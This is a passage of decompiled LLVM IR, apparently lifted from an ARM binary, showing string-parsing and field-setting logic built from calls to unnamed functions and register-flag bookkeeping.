  %v7_8f2c = icmp eq i32 %v5_8f10, 1
  store i1 %v7_8f2c, i1* %cpsr_z.global-to-local, align 1
  %v1_8f30 = add i32 %v2_8f28, -20736
  store i32 %v1_8f30, i32* %r3.global-to-local, align 4
  %v7_8f34 = icmp sgt i32 %v5_8f10, 1
  br i1 %v7_8f34, label %bb213, label %bb214

bb213:                                            ; preds = %dec_label_pc_8f20
  %v9_8f34 = add i32 %v5_8f10, -2
  store i32 %v9_8f34, i32* %r2.global-to-local, align 4
  br label %bb214

bb214:                                            ; preds = %dec_label_pc_8f20, %bb213
  %v3_8f3c = phi i32 [ %v5_8f10, %dec_label_pc_8f20 ], [ %v9_8f34, %bb213 ]
  %v1_8f38 = add i32 %v2_8f28, -20773
  store i32 %v1_8f38, i32* %r3.global-to-local, align 4
  %v0_8f3c = load i32, i32* @r5, align 4
  %v1_8f3c = trunc i32 %v0_8f3c to i8
  %v4_8f3c = add i32 %v3_8f3c, %v1_8f38
  %v5_8f3c = inttoptr i32 %v4_8f3c to i8*
  store i8 %v1_8f3c, i8* %v5_8f3c, align 1
  %v0_8f40 = load i32, i32* @r6, align 4
  store i32 %v0_8f40, i32* %r0.global-to-local, align 4
  %v1_8f44 = inttoptr i32 %v0_8f40 to i8*
  %v2_8f44 = call i32 @function_12c94(i8* %v1_8f44)
  %v0_8f48 = load i32, i32* @r5, align 4
  store i32 %v0_8f48, i32* %r1.global-to-local, align 4
  store i32 %v2_8f44, i32* @r4, align 4
  store i32 43, i32* %r0.global-to-local, align 4
  %v2_8f54 = inttoptr i32 %v0_8f48 to i32*
  %v3_8f54 = call i32 @function_12288(i32 43, i32* %v2_8f54)
  %v0_8f58 = load i32, i32* @r4, align 4
  store i32 %v0_8f58, i32* @r1, align 4
  store i32 %v3_8f54, i32* %r2.global-to-local, align 4
  %v0_8f60 = load i32, i32* @r6, align 4
  store i32 %v0_8f60, i32* %r0.global-to-local, align 4
  %v3_8f64 = inttoptr i32 %v0_8f60 to i8*
  %v4_8f64 = call i32 @function_12fe8(i8* %v3_8f64, i32 %v0_8f58, i32 %v3_8f54)
  store i32 %v4_8f64, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_8f68 = icmp slt i32 %v4_8f64, 0
  store i1 %v1_8f68, i1* %cpsr_n.global-to-local, align 1
  %v2_8f68 = icmp eq i32 %v4_8f64, 0
  store i1 %v2_8f68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8f68, label %.thread47, label %bb215

bb215:                                            ; preds = %bb214
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_8f70 = load i32, i32* @r8, align 4
  %v3_8f70 = inttoptr i32 %v2_8f70 to i32*
  store i32 1, i32* %v3_8f70, align 4
  br label %.thread47

.thread47:                                        ; preds = %bb214, %dec_label_pc_8ec0, %.thread46, %bb215
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_8f80 = load i32, i32* @r8, align 4
  %v2_8f80 = add i32 %v1_8f80, 4
  %v3_8f80 = inttoptr i32 %v2_8f80 to i32*
  store i32 0, i32* %v3_8f80, align 4
  %v3_8f84 = call i32 @function_12288(i32 41, i32* null)
  %v0_8f88 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8f88, i32* @r1, align 4
  store i32 %v3_8f84, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_8f94 = call i32 @function_12fe8(i8* %tmp199, i32 %v0_8f88, i32 %v3_8f84)
  store i32 %v4_8f94, i32* %r0.global-to-local, align 4
  %v1_8f9c = add i32 %v4_8f94, 1
  %v2_8f9c = icmp eq i32 %v4_8f94, -1
  store i1 %v2_8f9c, i1* %cpsr_c.global-to-local, align 1
  %v3_8f9c = sub i32 0, %v4_8f94
  %v4_8f9c = and i32 %v1_8f9c, %v3_8f9c
  %v5_8f9c = icmp slt i32 %v4_8f9c, 0
  store i1 %v5_8f9c, i1* %cpsr_v.global-to-local, align 1
  %v6_8f9c = icmp slt i32 %v1_8f9c, 0
  store i1 %v6_8f9c, i1* %cpsr_n.global-to-local, align 1
  %v7_8f9c = icmp eq i32 %v1_8f9c, 0
  store i1 %v7_8f9c, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r5, align 4
  br i1 %v7_8f9c, label %.thread48, label %dec_label_pc_8fa8

dec_label_pc_8fa8:                                ; preds = %.thread47
  %v0_8fa8 = load i32, i32* @r6, align 4
  store i32 %v0_8fa8, i32* %r1.global-to-local, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v2_8fb0 = inttoptr i32 %v0_8fa8 to i32*
  %v3_8fb0 = call i32 @function_12288(i32 41, i32* %v2_8fb0)
  %v0_8fb4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8fb4, i32* @r1, align 4
  store i32 %v3_8fb0, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_8fc0 = call i32 @function_12fe8(i8* %tmp199, i32 %v0_8fb4, i32 %v3_8fb0)
  store i32 %v4_8fc0, i32* %r0.global-to-local, align 4
  store i32 %v2_8748, i32* %lr.global-to-local, align 4
  %v2_8fcc = add i32 %v4_8fc0, %v2_8748
  store i32 %v2_8fcc, i32* %r3.global-to-local, align 4
  %v1_8fd0 = load i32, i32* @r5, align 4
  %v2_8fd0 = add i32 %v1_8fd0, %v2_8fcc
  %v3_8fd0 = inttoptr i32 %v2_8fd0 to i8*
  %v4_8fd0 = load i8, i8* %v3_8fd0, align 1
  %v2_8fd8 = icmp ugt i8 %v4_8fd0, 31
  store i1 %v2_8fd8, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8fd8 = icmp ult i8 %v4_8fd0, 32
  store i1 %v6_8fd8, i1* %cpsr_n.global-to-local, align 1
  %v7_8fd8 = icmp eq i8 %v4_8fd0, 32
  store i1 %v7_8fd8, i1* %cpsr_z.global-to-local, align 1
  %v2_8fe0 = zext i1 %v7_8fd8 to i32
  %v2_8fe0.v4_8fc0 = add i32 %v2_8fe0, %v4_8fc0
  store i32 %v2_8fe0.v4_8fc0, i32* @r4, align 4
  %v2_8fe4 = add i32 %v2_8fe0.v4_8fc0, %v2_8280
  store i32 %v2_8fe4, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8fe4, i32* %r0.global-to-local, align 4
  %v1_8ff0 = load i32, i32* %fp.global-to-local, align 4
  %v2_8ff0 = sub i32 %v1_8ff0, %v2_8fe0.v4_8fc0
  store i32 %v2_8ff0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_8ff8 = call i32 @function_12d58(i32 %v2_8fe4, i32 %v2_8ff0, i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32 2)
  store i32 %v5_8ff8, i32* %r0.global-to-local, align 4
  %v1_8ffc = add i32 %v5_8ff8, 1
  %v2_8ffc = icmp eq i32 %v5_8ff8, -1
  store i1 %v2_8ffc, i1* %cpsr_c.global-to-local, align 1
  %v3_8ffc = sub i32 0, %v5_8ff8
  %v4_8ffc = and i32 %v1_8ffc, %v3_8ffc
  %v5_8ffc = icmp slt i32 %v4_8ffc, 0
  store i1 %v5_8ffc, i1* %cpsr_v.global-to-local, align 1
  %v6_8ffc = icmp slt i32 %v1_8ffc, 0
  store i1 %v6_8ffc, i1* %cpsr_n.global-to-local, align 1
  %v7_8ffc = icmp eq i32 %v1_8ffc, 0
  store i1 %v7_8ffc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_8ff8, i32* %r2.global-to-local, align 4
  br i1 %v7_8ffc, label %.thread48, label %dec_label_pc_9008

dec_label_pc_9008:                                ; preds = %dec_label_pc_8fa8
  store i32 %v2_8748, i32* %ip.global-to-local, align 4
  %v1_9010 = load i32, i32* @r4, align 4
  %v2_9010 = add i32 %v1_9010, %v2_8748
  %v1_9014 = add i32 %v5_8ff8, -1
  %v2_9014 = icmp ne i32 %v5_8ff8, 0
  store i1 %v2_9014, i1* %cpsr_c.global-to-local, align 1
  %v3_9014 = sub i32 0, %v5_8ff8
  %v4_9014 = and i32 %v5_8ff8, %v3_9014
  %v5_9014 = icmp slt i32 %v4_9014, 0
  store i1 %v5_9014, i1* %cpsr_v.global-to-local, align 1
  %v6_9014 = icmp slt i32 %v1_9014, 0
  store i1 %v6_9014, i1* %cpsr_n.global-to-local, align 1
  %v7_9014 = icmp eq i32 %v5_8ff8, 1
  store i1 %v7_9014, i1* %cpsr_z.global-to-local, align 1
  %v1_9018 = add i32 %v2_9010, -20736
  store i32 %v1_9018, i32* %r3.global-to-local, align 4
  %v7_901c = icmp sgt i32 %v5_8ff8, 1
  br i1 %v7_901c, label %bb216, label %bb217

bb216:                                            ; preds = %dec_label_pc_9008
  %v9_901c = add i32 %v5_8ff8, -2
  store i32 %v9_901c, i32* %r2.global-to-local, align 4
  br label %bb217

bb217:                                            ; preds = %dec_label_pc_9008, %bb216
  %v3_9024 = phi i32 [ %v5_8ff8, %dec_label_pc_9008 ], [ %v9_901c, %bb216 ]
  %v1_9020 = add i32 %v2_9010, -20773
  store i32 %v1_9020, i32* %r3.global-to-local, align 4
  %v0_9024 = load i32, i32* @r6, align 4
  %v1_9024 = trunc i32 %v0_9024 to i8
  %v4_9024 = add i32 %v3_9024, %v1_9020
  %v5_9024 = inttoptr i32 %v4_9024 to i8*
  store i8 %v1_9024, i8* %v5_9024, align 1
  %v0_9028 = load i32, i32* @r5, align 4
  store i32 %v0_9028, i32* %r0.global-to-local, align 4
  %v1_902c = inttoptr i32 %v0_9028 to i8*
  %v2_902c = call i32 @function_12c94(i8* %v1_902c)
  %v0_9030 = load i32, i32* @r6, align 4
  store i32 %v0_9030, i32* %r1.global-to-local, align 4
  store i32 %v2_902c, i32* @r4, align 4
  store i32 42, i32* %r0.global-to-local, align 4
  %v2_903c = inttoptr i32 %v0_9030 to i32*
  %v3_903c = call i32 @function_12288(i32 42, i32* %v2_903c)
  %v0_9040 = load i32, i32* @r4, align 4
  store i32 %v0_9040, i32* @r1, align 4
  store i32 %v3_903c, i32* %r2.global-to-local, align 4
  %v0_9048 = load i32, i32* @r5, align 4
  store i32 %v0_9048, i32* %r0.global-to-local, align 4
  %v3_904c = inttoptr i32 %v0_9048 to i8*
  %v4_904c = call i32 @function_12fe8(i8* %v3_904c, i32 %v0_9040, i32 %v3_903c)
  store i32 %v4_904c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9050 = icmp slt i32 %v4_904c, 0
  store i1 %v1_9050, i1* %cpsr_n.global-to-local, align 1
  %v2_9050 = icmp eq i32 %v4_904c, 0
  store i1 %v2_9050, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9050, label %.thread48, label %bb218

bb218:                                            ; preds = %bb217
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9058 = load i32, i32* @r8, align 4
  %v3_9058 = add i32 %v2_9058, 4
  %v4_9058 = inttoptr i32 %v3_9058 to i32*
  store i32 1, i32* %v4_9058, align 4
  br label %.thread48

.thread48:                                        ; preds = %bb217, %dec_label_pc_8fa8, %.thread47, %bb218
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v3_9064 = call i32 @function_12288(i32 40, i32* null)
  %v0_9068 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9068, i32* @r1, align 4
  store i32 %v3_9064, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_9074 = call i32 @function_12fe8(i8* %tmp199, i32 %v0_9068, i32 %v3_9064)
  store i32 %v4_9074, i32* %r0.global-to-local, align 4
  %v1_9078 = add i32 %v4_9074, 1
  %v2_9078 = icmp eq i32 %v4_9074, -1
  store i1 %v2_9078, i1* %cpsr_c.global-to-local, align 1
  %v3_9078 = sub i32 0, %v4_9074
  %v4_9078 = and i32 %v1_9078, %v3_9078
  %v5_9078 = icmp slt i32 %v4_9078, 0
  store i1 %v5_9078, i1* %cpsr_v.global-to-local, align 1
  %v6_9078 = icmp slt i32 %v1_9078, 0
  store i1 %v6_9078, i1* %cpsr_n.global-to-local, align 1
  %v7_9078 = icmp eq i32 %v1_9078, 0
  store i1 %v7_9078, i1* %cpsr_z.global-to-local, align 1
  store i32 -20737, i32* %r5.global-to-local, align 4
  br i1 %v7_9078, label %.thread, label %dec_label_pc_9090

.thread:                                          ; preds = %.thread48
  store i32 -20773, i32* %r5.global-to-local, align 4
  %v2_9088 = load i32, i32* @r8, align 4
  %v3_9088 = add i32 %v2_9088, 8
  %v4_9088 = inttoptr i32 %v3_9088 to i32*
  store i32 0, i32* %v4_9088, align 4
  br label %dec_label_pc_9124

dec_label_pc_9090:                                ; preds = %.thread48
  store i32 -20773, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v3_9098 = call i32 @function_12288(i32 40, i32* null)
  %v0_909c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_909c, i32* @r1, align 4
  store i32 %v3_9098, i32* %r2.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v4_90a8 = call i32 @function_12fe8(i8* %tmp199, i32 %v0_909c, i32 %v3_9098)
  store i32 %v4_90a8, i32* %r0.global-to-local, align 4
  store i32 %v2_8748, i32* %lr.global-to-local, align 4
  %v2_90b4 = add i32 %v4_90a8, %v2_8748
  store i32 %v2_90b4, i32* %r3.global-to-local, align 4
  %v1_90b8 = load i32, i32* @r5, align 4
  %v2_90b8 = add i32 %v1_90b8, %v2_90b4
  %v3_90b8 = inttoptr i32 %v2_90b8 to i8*
  %v4_90b8 = load i8, i8* %v3_90b8, align 1
  %v2_90c0 = icmp ugt i8 %v4_90b8, 31
  store i1 %v2_90c0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_90c0 = icmp ult i8 %v4_90b8, 32
  store i1 %v6_90c0, i1* %cpsr_n.global-to-local, align 1
  %v7_90c0 = icmp eq i8 %v4_90b8, 32
  store i1 %v7_90c0, i1* %cpsr_z.global-to-local, align 1
  %v2_90c8 = zext i1 %v7_90c0 to i32
  %v2_90c8.v4_90a8 = add i32 %v2_90c8, %v4_90a8
  store i32 %v2_90c8.v4_90a8, i32* @r4, align 4
  %v2_90cc = add i32 %v2_90c8.v4_90a8, %v2_8280
  store i32 %v2_90cc, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_90cc, i32* %r0.global-to-local, align 4
  %v1_90d8 = load i32, i32* %fp.global-to-local, align 4
  %v2_90d8 = sub i32 %v1_90d8, %v2_90c8.v4_90a8
  store i32 %v2_90d8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_90e0 = call i32 @function_12d58(i32 %v2_90cc, i32 %v2_90d8, i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32 2)
  store i32 %v5_90e0, i32* %r0.global-to-local, align 4
  %v1_90e4 = add i32 %v5_90e0, 1
  %v2_90e4 = icmp eq i32 %v5_90e0, -1
  store i1 %v2_90e4, i1* %cpsr_c.global-to-local, align 1
  %v3_90e4 = sub i32 0, %v5_90e0
  %v4_90e4 = and i32 %v1_90e4, %v3_90e4
  %v5_90e4 = icmp slt i32 %v4_90e4, 0
  store i1 %v5_90e4, i1* %cpsr_v.global-to-local, align 1
  %v6_90e4 = icmp slt i32 %v1_90e4, 0
  store i1 %v6_90e4, i1* %cpsr_n.global-to-local, align 1
  %v7_90e4 = icmp eq i32 %v1_90e4, 0
  store i1 %v7_90e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_90e0, i32* %r2.global-to-local, align 4
  br i1 %v7_90e4, label %dec_label_pc_9124, label %dec_label_pc_90f0

dec_label_pc_90f0:                                ; preds = %dec_label_pc_9090
  store i32 %v2_8748, i32* %ip.global-to-local, align 4
  %v1_90f8 = load i32, i32* @r4, align 4
  %v2_90f8 = add i32 %v1_90f8, %v2_8748
  %v1_90fc = add i32 %v5_90e0, -1
  %v2_90fc = icmp ne i32 %v5_90e0, 0
  store i1 %v2_90fc, i1* %cpsr_c.global-to-local, align 1
  %v3_90fc = sub i32 0, %v5_90e0
  %v4_90fc = and i32 %v5_90e0, %v3_90fc
  %v5_90fc = icmp slt i32 %v4_90fc, 0
  store i1 %v5_90fc, i1* %cpsr_v.global-to-local, align 1
  %v6_90fc = icmp slt i32 %v1_90fc, 0
  store i1 %v6_90fc, i1* %cpsr_n.global-to-local, align 1
  %v7_90fc = icmp eq i32 %v5_90e0, 1
  store i1 %v7_90fc, i1* %cpsr_z.global-to-local, align 1
  %v1_9100 = add i32 %v2_90f8, -20736
  store i32 %v1_9100, i32* %r3.global-to-local, align 4
  %v7_9104 = icmp sgt i32 %v5_90e0, 1
  br i1 %v7_9104, label %bb219, label %bb220

bb219:                                            ; preds = %dec_label_pc_90f0
  %v9_9104 = add i32 %v5_90e0, -2
  store i32 %v9_9104, i32* %r2.global-to-local, align 4
  br label %bb220

bb220:                                            ; preds = %dec_label_pc_90f0, %bb219
  %v3_9118 = phi i32 [ %v5_90e0, %dec_label_pc_90f0 ], [ %v9_9104, %bb219 ]
  %v1_9108 = add i32 %v2_90f8, -20773
  store i32 %v1_9108, i32* %r3.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v0_9110 = load i32, i32* @r5, align 4
  store i32 %v0_9110, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v4_9118 = add i32 %v3_9118, %v1_9108
  %v5_9118 = inttoptr i32 %v4_9118 to i8*
  store i8 0, i8* %v5_9118, align 1
  %v2_911c = inttoptr i32 %v0_9110 to i8*
  %v3_911c = call i32 @function_12dc0(i8* %v2_911c, i32 10)
  store i32 %v3_911c, i32* %r0.global-to-local, align 4
  %v1_9120 = load i32, i32* @r8, align 4
  %v2_9120 = add i32 %v1_9120, 8
  %v3_9120 = inttoptr i32 %v2_9120 to i32*
  store i32 %v3_911c, i32* %v3_9120, align 4
  br label %dec_label_pc_9124

dec_label_pc_9124:                                ; preds = %.thread, %dec_label_pc_9090, %bb220
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_9128

dec_label_pc_9128:                                ; preds = %dec_label_pc_92fc, %dec_label_pc_927c, %dec_label_pc_9124
  %v1_9134 = phi i32 [ 0, %dec_label_pc_9124 ], [ %v0_927c, %dec_label_pc_927c ], [ %v1_9134.pre.pre, %dec_label_pc_92fc ]
  store i32 %v2_8280, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v2_9134 = add i32 %v1_9134, %v2_8280
  store i32 %v2_9134, i32* @r4, align 4
  %v3_9138 = call i32 @function_12288(i32 39, i32* null)
  %v0_913c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_913c, i32* @r1, align 4
  store i32 %v3_9138, i32* %r2.global-to-local, align 4
  %v0_9144 = load i32, i32* @r4, align 4
  store i32 %v0_9144, i32* %r0.global-to-local, align 4
  %v3_9148 = inttoptr i32 %v0_9144 to i8*
  %v4_9148 = call i32 @function_12fe8(i8* %v3_9148, i32 %v0_913c, i32 %v3_9138)
  store i32 %v4_9148, i32* %r0.global-to-local, align 4
  %v1_9150 = add i32 %v4_9148, 1
  %v2_9150 = icmp eq i32 %v4_9148, -1
  store i1 %v2_9150, i1* %cpsr_c.global-to-local, align 1
  %v3_9150 = sub i32 0, %v4_9148
  %v4_9150 = and i32 %v1_9150, %v3_9150
  %v5_9150 = icmp slt i32 %v4_9150, 0
  store i1 %v5_9150, i1* %cpsr_v.global-to-local, align 1
  %v6_9150 = icmp slt i32 %v1_9150, 0
  store i1 %v6_9150, i1* %cpsr_n.global-to-local, align 1
  %v7_9150 = icmp eq i32 %v1_9150, 0
  store i1 %v7_9150, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  br i1 %v7_9150, label %dec_label_pc_9328, label %dec_label_pc_915c

dec_label_pc_915c:                                ; preds = %dec_label_pc_9128
  %v0_915c = load i32, i32* @r8, align 4
  %v1_915c = add i32 %v0_915c, 12
  %v2_915c = inttoptr i32 %v1_915c to i32*
  %v3_915c = load i32, i32* %v2_915c, align 4
  store i32 %v3_915c, i32* %r3.global-to-local, align 4
  %v1_9160 = add i32 %v3_915c, -4
  %v2_9160 = icmp ugt i32 %v3_915c, 3
  store i1 %v2_9160, i1* %cpsr_c.global-to-local, align 1
  %v3_9160 = sub i32 3, %v3_915c
  %v4_9160 = and i32 %v3_9160, %v3_915c
  %v5_9160 = icmp slt i32 %v4_9160, 0
  store i1 %v5_9160, i1* %cpsr_v.global-to-local, align 1
  %v6_9160 = icmp slt i32 %v1_9160, 0
  store i1 %v6_9160, i1* %cpsr_n.global-to-local, align 1
  %v7_9160 = icmp eq i32 %v3_915c, 4
  store i1 %v7_9160, i1* %cpsr_z.global-to-local, align 1
  %v8_9164 = icmp sgt i32 %v3_915c, 4
  br i1 %v8_9164, label %dec_label_pc_9328, label %dec_label_pc_9168

dec_label_pc_9168:                                ; preds = %dec_label_pc_915c
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 39, i32* %r0.global-to-local, align 4
  %v3_9170 = call i32 @function_12288(i32 39, i32* null)
  %v0_9174 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9174, i32* @r1, align 4
  store i32 %v3_9170, i32* %r2.global-to-local, align 4
  %v0_917c = load i32, i32* @r4, align 4
  store i32 %v0_917c, i32* %r0.global-to-local, align 4
  %v3_9180 = inttoptr i32 %v0_917c to i8*
  %v4_9180 = call i32 @function_12fe8(i8* %v3_9180, i32 %v0_9174, i32 %v3_9170)
  store i32 %v4_9180, i32* %r0.global-to-local, align 4
  %v0_9188 = load i32, i32* @r5, align 4
  %v2_9188 = add i32 %v0_9188, %v4_9180
  store i32 %v2_9188, i32* @sl, align 4
  store i32 %v2_8748, i32* %r1.global-to-local, align 4
  %v2_9190 = add i32 %v2_9188, %v2_8748
  store i32 %v2_9190, i32* %r3.global-to-local, align 4
  %v1_9194 = load i32, i32* @r6, align 4
  %v2_9194 = add i32 %v1_9194, %v2_9190
  %v3_9194 = inttoptr i32 %v2_9194 to i8*
  %v4_9194 = load i8, i8* %v3_9194, align 1
  %v6_9194 = zext i8 %v4_9194 to i32
  store i32 %v6_9194, i32* %r2.global-to-local, align 4
  %v2_9198 = icmp ugt i8 %v4_9194, 31
  store i1 %v2_9198, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9198 = icmp ult i8 %v4_9194, 32
  store i1 %v6_9198, i1* %cpsr_n.global-to-local, align 1
  %v7_9198 = icmp eq i8 %v4_9194, 32
  store i1 %v7_9198, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9198, label %bb221, label %bb222

bb221:                                            ; preds = %dec_label_pc_9168
  %v2_919c = add i32 %v4_9180, 1
  store i32 %v2_919c, i32* %r0.global-to-local, align 4
  br label %bb222

bb222:                                            ; preds = %dec_label_pc_9168, %bb221
  %v2_91ac = phi i32 [ %v4_9180, %dec_label_pc_9168 ], [ %v2_919c, %bb221 ]
  %v1_91a0 = load i32, i32* %fp.global-to-local, align 4
  %v2_91a0 = sub i32 %v1_91a0, %v0_9188
  store i32 %v2_91a0, i32* %r3.global-to-local, align 4
  %v2_91a4 = sub i32 %v2_91a0, %v2_91ac
  store i32 %v2_91a4, i32* @r7, align 4
  %v0_91a8 = load i32, i32* @r4, align 4
  %v2_91a8 = add i32 %v0_91a8, %v2_91ac
  store i32 %v2_91a8, i32* @r6, align 4
  br i1 %v7_9198, label %bb223, label %bb224

bb223:                                            ; preds = %bb222
  %v3_91ac = add i32 %v2_91ac, %v0_9188
  store i32 %v3_91ac, i32* @sl, align 4
  br label %bb224

bb224:                                            ; preds = %bb222, %bb223
  store i32 %v2_91a4, i32* %r1.global-to-local, align 4
  store i32 %v2_91a8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_91c0 = call i32 @function_12d58(i32 %v2_91a8, i32 %v2_91a4, i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32 2)
  store i32 %v5_91c0, i32* %r0.global-to-local, align 4
  %v1_91c4 = add i32 %v5_91c0, 1
  %v2_91c4 = icmp eq i32 %v5_91c0, -1
  store i1 %v2_91c4, i1* %cpsr_c.global-to-local, align 1
  %v3_91c4 = sub i32 0, %v5_91c0
  %v4_91c4 = and i32 %v1_91c4, %v3_91c4
  %v5_91c4 = icmp slt i32 %v4_91c4, 0
  store i1 %v5_91c4, i1* %cpsr_v.global-to-local, align 1
  %v6_91c4 = icmp slt i32 %v1_91c4, 0
  store i1 %v6_91c4, i1* %cpsr_n.global-to-local, align 1
  %v7_91c4 = icmp eq i32 %v1_91c4, 0
  store i1 %v7_91c4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_91c0, i32* @r4, align 4
  br i1 %v7_91c4, label %dec_label_pc_927c, label %dec_label_pc_91d0

dec_label_pc_91d0:                                ; preds = %bb224
  store i32 %v2_8280, i32* %r2.global-to-local, align 4
  %v1_91d4 = add i32 %v5_91c0, -1
  %v2_91d4 = icmp ne i32 %v5_91c0, 0
  store i1 %v2_91d4, i1* %cpsr_c.global-to-local, align 1
  %v3_91d4 = sub i32 0, %v5_91c0
  %v4_91d4 = and i32 %v5_91c0, %v3_91d4
  %v5_91d4 = icmp slt i32 %v4_91d4, 0
  store i1 %v5_91d4, i1* %cpsr_v.global-to-local, align 1
  %v6_91d4 = icmp slt i32 %v1_91d4, 0
  store i1 %v6_91d4, i1* %cpsr_n.global-to-local, align 1
  %v7_91d4 = icmp eq i32 %v5_91c0, 1
  store i1 %v7_91d4, i1* %cpsr_z.global-to-local, align 1
  %v7_91d8 = icmp slt i32 %v5_91c0, 2
  br i1 %v7_91d8, label %bb226, label %bb225

bb225:                                            ; preds = %dec_label_pc_91d0
  %v9_91d8 = add i32 %v5_91c0, -2
  store i32 %v9_91d8, i32* @r4, align 4
  br label %bb226

bb226:                                            ; preds = %dec_label_pc_91d0, %bb225
  %v1_91dc = load i32, i32* @sl, align 4
  %v2_91dc = add i32 %v1_91dc, %v2_8280
  store i32 %v2_91dc, i32* @r5, align 4
  %v0_91e0 = load i32, i32* @r6, align 4
  store i32 %v0_91e0, i32* %r0.global-to-local, align 4
  %v0_91e4 = load i32, i32* @r7, align 4
  store i32 %v0_91e4, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15f3c.42 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_91f0 = call i32 @function_12d58(i32 %v0_91e0, i32 %v0_91e4, i32 ptrtoint (i32* @global_var_15f3c.42 to i32), i32 1)
  store i32 %v4_91f0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_91f4 = icmp slt i32 %v4_91f0, 0
  store i1 %v1_91f4, i1* %cpsr_n.global-to-local, align 1
  %v2_91f4 = icmp eq i32 %v4_91f0, 0
  store i1 %v2_91f4, i1* %cpsr_z.global-to-local, align 1
  %tmp227 = icmp slt i32 %v4_91f0, 1
  br i1 %tmp227, label %.dec_label_pc_9214_crit_edge, label %dec_label_pc_91fc

.dec_label_pc_9214_crit_edge:                     ; preds = %bb226
  %v1_921c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_9214

dec_label_pc_91fc:                                ; preds = %bb226
  %v0_91fc = load i32, i32* @r6, align 4
  store i32 %v0_91fc, i32* %r0.global-to-local, align 4
  %v0_9200 = load i32, i32* @r7, align 4
  store i32 %v0_9200, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15f3c.42 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_920c = call i32 @function_12d58(i32 %v0_91fc, i32 %v0_9200, i32 ptrtoint (i32* @global_var_15f3c.42 to i32), i32 1)
  store i32 %v4_920c, i32* %r0.global-to-local, align 4
  %v1_9210 = add i32 %v4_920c, -1
  store i32 %v1_9210, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9214

dec_label_pc_9214:                                ; preds = %.dec_label_pc_9214_crit_edge, %dec_label_pc_91fc
  %v1_921c = phi i32 [ %v1_921c.pre, %.dec_label_pc_9214_crit_edge ], [ %v1_9210, %dec_label_pc_91fc ]
  store i32 %v2_8748, i32* %ip.global-to-local, align 4
  %v1_9224 = add i32 %v2_921c, %v1_921c
  store i32 %v1_9224, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9234 = load i32, i32* @sl, align 4
  %v4_9234 = add i32 %v3_9234, %v1_9224
  %v5_9234 = inttoptr i32 %v4_9234 to i8*
  store i8 0, i8* %v5_9234, align 1
  %storemerge4.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_9254.pre = load i32, i32* @r5, align 4
